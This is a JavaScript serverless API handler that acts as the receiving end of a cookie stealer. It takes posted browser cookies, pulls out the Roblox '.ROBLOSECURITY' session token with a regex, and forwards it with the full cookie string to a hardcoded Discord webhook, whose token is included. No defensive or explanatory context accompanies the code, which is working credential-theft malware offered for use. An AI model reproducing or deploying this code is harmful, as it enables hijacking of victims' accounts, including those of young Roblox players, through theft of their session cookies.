export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { cookies, url } = req.body || {};

  const webhookURL = "https://discord.com/api/webhooks/1501284240484995307/Ov6tKqjQmDxbMaKTYoEfN7QHTEPjqv0XyCnkl3d91dMVM5tlFA6l3B00tsBoOvdYo7kq";

  let message = `**Cookie received**\nURL: ${url || "N/A"}\nCookies: ||${cookies || "none"}||`;

  if (cookies && cookies.includes(".ROBLOSECURITY")) {
    const match = cookies.match(/.ROBLOSECURITY=([^;]+)/);
    if (match) {
      message = `**ROBLOX COOKIE FOUND**\n${match[0]}\nFull cookies: ||${cookies}||`;
    }
  }

  const payload = {
    content: message,
  };

  try {
    await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    return res.status(200).json({ ok: true });
  } catch (error) {
    return res.status(500).json({ error: "Failed to forward log" });
  }
}
